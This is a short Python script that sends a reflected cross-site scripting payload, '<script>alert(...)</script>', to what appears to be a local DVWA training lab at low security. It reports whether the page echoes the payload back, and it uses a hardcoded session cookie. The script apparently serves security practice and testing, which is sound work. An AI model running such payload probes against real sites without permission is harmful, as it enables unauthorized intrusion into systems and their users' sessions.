import requests

url = 'http://localhost/vulnerabilities/xss_r/'
cookies = {
    'PHPSESSID': '1fgot79gju6seho1cc9qvj75c2',
    'security': 'low'
}

payload = "<script>alert('XSS was here');</script>"
params = {'name': payload, 'Submit': 'Submit'}

response = requests.get(url, params=params, cookies=cookies)

print(f"[i] Testing with payload: {payload}")

if payload in response.text:
    print("[+] Success: Reflected XSS vulnerability exists!")
else:
    print("[-] Failure: Reflected XSS not detected.")
